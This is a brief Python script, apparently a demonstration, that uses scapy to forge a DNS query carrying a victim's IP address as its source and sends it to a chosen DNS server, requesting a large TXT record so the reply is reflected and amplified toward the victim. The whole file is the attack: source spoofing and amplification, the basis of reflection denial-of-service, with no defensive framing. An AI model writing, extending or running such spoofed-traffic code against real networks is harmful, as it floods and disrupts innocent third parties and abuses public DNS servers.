from scapy.all import IP, UDP, DNS, DNSQR, send
import sys

victim_ip = sys.argv[1]      # the IP we're spoofing (pretending to be)
dns_server_ip = sys.argv[2]  # the amplifier we're querying

pkt = IP(src=victim_ip, dst=dns_server_ip) / \
      UDP(sport=53, dport=53) / \
      DNS(rd=1, qd=DNSQR(qname="bigrecord.test", qtype="TXT"))

send(pkt, verbose=1)
print(f"Sent spoofed query: claimed src={victim_ip} -> dst={dns_server_ip}")